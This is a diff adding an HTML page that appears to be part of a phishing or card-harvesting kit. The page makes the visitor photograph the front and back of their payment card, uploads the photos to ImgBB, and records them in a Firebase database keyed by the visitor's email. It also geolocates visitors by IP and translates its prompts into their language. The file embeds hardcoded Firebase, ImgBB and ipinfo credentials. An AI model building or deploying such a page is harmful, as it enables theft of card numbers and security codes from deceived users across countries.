@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Capture and Store Card Images</title>
+  <style>
+   @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap');
+    video, canvas {
+      display: block;
+      width: 100%;
+   border: 1.2px solid #4b0082;
+   box-shadow: 0 0 5px rgba(75, 0, 130, 0.5);
+  border-radius: 4px;
+    }
+   .icon-container {
+      display: block;
+      margin: 20px auto;
+      text-align: center;
+   display: flex;
+   text-align: center;
+   justify-content: space-between;
+   align-items: center;
+  
+      }
+    .icon-container img {
+      width: 50px;
+      height: 50px;
+      cursor: pointer;
+      margin: 0 10px;
+   
+    }
+    p {
+      text-align: center;
+      font-size: 1.2em;
+    }
+ .text-bold {
+      font-family: "Poppins", sans-serif;
+   
+    }
+  </style>
+
+  <!-- Firebase v8 SDK -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+</head>
+<body>
+ <div style="text-align: center; font-size: 16px; font-weight: 530;">
+<p class="text-bold" id="response1"></p>
+ 
+  <!-- Video preview from camera -->
+  <video id="video" autoplay playsinline></video>
+
+ <img id="capture" style="width: 15%; margin-left: 41%; padding: 8px; border-radius: 50%; margin-top: 5%;" src="https://img.icons8.com/?size=100&id=xA722DfohUfo&format=png&color=4b0082" alt=""></img>
+ 
+ 
+
+  <!-- Hidden canvas to capture the image -->
+  <canvas id="canvas" style="display:none;"></canvas>
+</div>
+  <!-- Image preview and confirmation -->
+  <div id="confirmation" style="display:none; margin-top: -5%;">
+    <p style=" font-size: 14px; font-weight: 530;" class="text-bold" id="response"></p>
+    <img id="preview" src="" alt="Preview Image">
+   
+    <div class="icon-container">
+     
+      <img id="bad-icon" src="https://img.icons8.com/color/48/000000/delete-sign.png" alt="Bad Icon">
+  <img id="good-icon" src="https://img.icons8.com/?size=100&id=uNzoeGXjLfRM&format=png&color=40C057" alt="Good Icon">
+    </div>
+  </div>
+
+  <script>
+ // The translateText function must be defined before it is used
+  function translateText(text, targetLanguage, callback) {
+      fetch(`https://translate.googleapis.com/translate_a/single?client=gtx&sl=es&tl=${targetLanguage}&dt=t&q=${encodeURI(text)}`)
+          .then(response => response.json())
+          .then(data => {
+              const translatedText = data[0].map(item => item[0]).join('');
+              callback(translatedText);
+          })
+          .catch(error => console.error('Error translating text:', error));
+  }
+
+ function detectCountry(callback) {
+      fetch('https://ipinfo.io/json?token=84581b889c1970') // Replace with your ipinfo.io token
+          .then(response => response.json())
+          .then(data => {
+              console.log('Detected country data:', JSON.stringify(data, null, 2));
+
+              const countryCode = data.country;
+              const city = data.city || 'Unknown';
+
+              // Automatically get the country name from the country code
+              let countryName = 'Unknown';
+              if (countryCode) {
+                  try {
+                      countryName = new Intl.DisplayNames(['en'], { type: 'region' }).of(countryCode);
+                  } catch (error) {
+                      console.error('Error detecting country name:', error);
+                  }
+              }
+
+              if (countryCode && countryName) {
+                  callback(countryCode, countryName, city);
+              } else {
+                  console.error('Failed to detect country name.');
+                  callback(countryCode, 'Unknown', city);
+              }
+          })
+          .catch(error => {
+              console.error('Error detecting country:', error);
+              callback(null, 'Unknown', 'Unknown');
+          });
+  }
+
+    const countryLanguageMap = {
+        "AF": "fa", "AL": "sq", "DZ": "ar", "AS": "en", "AD": "ca", "AO": "pt", "AG": "en", 
+        "AR": "es", "AM": "hy", "AU": "en", "AT": "de", "AZ": "az", "BS": "en", "BH": "ar", 
+        "BD": "bn", "BB": "en", "BY": "be", "BE": "nl", "BZ": "en", "BJ": "fr", "BT": "dz", 
+        "BO": "es", "BA": "bs", "BW": "en", "BR": "pt", "BN": "ms", "BG": "bg", "BF": "fr", 
+        "BI": "fr", "CV": "pt", "KH": "km", "CM": "fr", "CA": "en", "CF": "fr", "TD": "fr", 
+        "CL": "es", "CN": "zh-CN", "CO": "es", "KM": "ar", "CD": "fr", "CG": "fr", "CR": "es", 
+        "CI": "fr", "HR": "hr", "CU": "es", "CY": "el", "CZ": "cs", "DK": "da", "DJ": "fr", 
+        "DM": "en", "DO": "es", "EC": "es", "EG": "ar", "SV": "es", "GQ": "es", "ER": "ti", 
+        "EE": "et", "SZ": "en", "ET": "am", "FJ": "en", "FI": "fi", "FR": "fr", "GA": "fr", 
+        "GM": "en", "GE": "ka", "DE": "de", "GH": "en", "GR": "el", "GD": "en", "GT": "es", 
+        "GN": "fr", "GW": "pt", "GY": "en", "HT": "fr", "HN": "es", "HU": "hu", "IS": "is", 
+        "IN": "hi", "ID": "id", "IR": "fa", "IQ": "ar", "IE": "en", "IL": "he", "IT": "it", 
+        "JM": "en", "JP": "ja", "JO": "ar", "KZ": "kk", "KE": "sw", "KI": "en", "KP": "ko", 
+        "KR": "ko", "KW": "ar", "KG": "ky", "LA": "lo", "LV": "lv", "LB": "ar", "LS": "en", 
+        "LR": "en", "LY": "ar", "LI": "de", "LT": "lt", "LU": "lb", "MG": "mg", "MW": "en", 
+        "MY": "ms", "MV": "dv", "ML": "fr", "MT": "mt", "MH": "en", "MR": "ar", "MU": "en", 
+        "MX": "es", "FM": "en", "MD": "ro", "MC": "fr", "MN": "mn", "ME": "sr", "MA": "ar", 
+        "MZ": "pt", "MM": "my", "NA": "en", "NR": "na", "NP": "ne", "NL": "nl", "NZ": "en", 
+        "NI": "es", "NE": "fr", "NG": "en", "MK": "mk", "NO": "no", "OM": "ar", "PK": "ur", 
+        "PW": "en", "PA": "es", "PG": "en", "PY": "es", "PE": "es", "PH": "tl", "PL": "pl", 
+        "PT": "pt", "QA": "ar", "RO": "ro", "RU": "ru", "RW": "rw", "KN": "en", "LC": "en", 
+        "VC": "en", "WS": "sm", "SM": "it", "ST": "pt", "SA": "ar", "SN": "fr", "RS": "sr", 
+        "SC": "fr", "SL": "en", "SG": "zh-CN", "SK": "sk", "SI": "sl", "SB": "en", "SO": "so", 
+        "ZA": "af", "SS": "en", "ES": "es", "LK": "si", "SD": "ar", "SR": "nl", "SE": "sv", 
+        "CH": "de", "SY": "ar", "TW": "zh-TW", "TJ": "tg", "TZ": "sw", "TH": "th", "TL": "pt", 
+        "TG": "fr", "TO": "to", "TT": "en", "TN": "ar", "TR": "tr", "TM": "tk", "UG": "en", 
+        "UA": "uk", "AE": "ar", "GB": "en", "US": "en", "UY": "es", "UZ": "uz", "VU": "bi", 
+        "VE": "es", "VN": "vi", "YE": "ar", "ZM": "en", "ZW": "en"
+    };
+
+    document.addEventListener('DOMContentLoaded', function() {
+        detectCountry(function(countryCode) {
+            const targetLanguage = countryLanguageMap[countryCode] || 'en';
+            translatePageText(targetLanguage);
+        });
+    });
+
+    function translatePageText(targetLanguage) {
+        const elementsToTranslate = [
+         ]
+  elementsToTranslate.forEach(element => {
+            translateText(element.text, targetLanguage, function(translatedText) {
+                document.getElementById(element.id).textContent = translatedText;
+            });
+        });
+   }
+    // Firebase Configuration
+    const firebaseConfig = {
+      apiKey: "AIzaSyBZehk_8tWBhQOtCcS3VTzRRSCFCLvFGQA",
+      authDomain: "tuak-9f342.firebaseapp.com",
+      databaseURL: "https://tuak-9f342-default-rtdb.firebaseio.com",
+      projectId: "tuak-9f342",
+      storageBucket: "tuak-9f342.appspot.com",
+      messagingSenderId: "9176071516",
+      appId: "1:9176071516:web:38491206a78ed1c4035599",
+      measurementId: "G-BM58W3CJTQ"
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+// Store detected country in Firebase
+  detectCountry((countryCode, countryName) => {
+      const email = localStorage.getItem('userEmail');
+      if (email) {
+          const sanitizedEmail = email.replace(/\./g, ',');
+          db.ref(`messages/${sanitizedEmail}`).update({
+              countryName: countryName,
+              countryCode: countryCode
+          }).then(() => {
+              console.log('Country data saved successfully.');
+          }).catch((error) => {
+              console.error('Error saving country data:', error);
+          });
+      } else {
+          console.warn('User email is not set in localStorage.');
+      }
+  });
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const captureButton = document.getElementById('capture');
+    const responseText = document.getElementById('response');
+  const responseText1 = document.getElementById('response1');
+    const confirmation = document.getElementById('confirmation');
+    const previewImage = document.getElementById('preview');
+    const goodIcon = document.getElementById('good-icon');
+    const badIcon = document.getElementById('bad-icon');
+   function translateAndSetText(responseText1, text, targetLanguage) {
+    translateText(text, targetLanguage, (translatedText) => {
+        responseText1.textContent = translatedText;
+    });
+     }
+   
+    let isFrontImageCaptured = false;
+
+    // Access the camera (back camera specifically)
+    async function startCamera() {
+     
+     const errorMessage = "Please Snap The Front Picture Of Your Card 💳.";
+    detectCountry((countryCode) => {
+        const targetLanguage = countryLanguageMap[countryCode] || 'en';
+        translateAndSetText(responseText1, errorMessage, targetLanguage);
+        });
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "environment" }
+        });
+        video.srcObject = stream;
+      } catch (error) {
+        console.error('Error accessing the camera:', error);
+        alert('Camera access denied or unavailable.');
+      }
+    }
+
+    // Function to upload image to ImgBB and store in Firebase
+    async function uploadImage(blob, key) {
+      const formData = new FormData();
+      formData.append('image', blob);
+
+      const apiKey = '87ba063b9c356db7082b07f643a2f6e4'; // Replace with your ImgBB API key
+      const apiUrl = `https://api.imgbb.com/1/upload?key=${apiKey}`;
+
+      const response = await fetch(apiUrl, { method: 'POST', body: formData });
+      const result = await response.json();
+
+      if (result.success) {
+        const imageUrl = result.data.url;
+
+        // Get the user's email from local storage
+        const email = localStorage.getItem('userEmail');
+        const sanitizedEmail = email.replace(/\./g, ',');
+
+        // Store the image URL in Firebase under the email key
+        await firebase.database().ref(`messages/${sanitizedEmail}`).update({
+          [key]: imageUrl,
+          timestamp: Date.now()
+        });
+
+        return imageUrl;
+      } else {
+        throw new Error('Image upload failed');
+      }
+    }
+
+    // Show confirmation UI with the snapped image
+    function showConfirmation(blobUrl) {
+      const errorMessage = "Does the image looks OK?";
+    detectCountry((countryCode) => {
+        const targetLanguage = countryLanguageMap[countryCode] || 'en';
+        translateAndSetText(responseText, errorMessage, targetLanguage);
+        });
+     responseText1.style.display ='block'
+      video.style.display ='none'
+      confirmation.style.display = 'block';
+      previewImage.src = blobUrl;
+      captureButton.style.display = 'none';
+    }
+
+    // Hide confirmation UI
+    function hideConfirmation() {
+     
+      video.style.display ='block'
+      confirmation.style.display = 'none';
+      captureButton.style.display = 'block';
+    }
+
+    // Capture button click event
+    captureButton.addEventListener('click', () => {
+      const context = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+
+      // Draw the current video frame onto the canvas
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // Convert the canvas image to a Blob
+      canvas.toBlob((blob) => {
+        if (!blob) {
+          alert('Failed to capture image.');
+          return;
+        }
+
+        const blobUrl = URL.createObjectURL(blob);
+        showConfirmation(blobUrl);
+
+        // Handle confirmation actions
+        goodIcon.onclick = async () => {
+          try {
+            if (!isFrontImageCaptured) {
+              await uploadImage(blob, 'imageUrl');
+              
+            const errorMessage = "Please Snap The Back Picture Of Your Card 💳.";
+    detectCountry((countryCode) => {
+        const targetLanguage = countryLanguageMap[countryCode] || 'en';
+        translateAndSetText(responseText1, errorMessage, targetLanguage);
+        }); 
+              isFrontImageCaptured = true;
+            } else {
+              await uploadImage(blob, 'imageUrl1');
+         isFrontImageCaptured = false;     
+startCamera();
+        
+            }
+            hideConfirmation();
+          } catch (error) {
+            console.error('Error uploading image:', error);
+            responseText.innerText = 'Error uploading image.';
+          }
+        };
+
+        badIcon.onclick = () => {
+          hideConfirmation();
+        };
+      }, 'image/jpeg');
+    });
+
+    // Start the camera when the page loads
+    window.onload = startCamera;
+  </script>
+</body>
+</html>
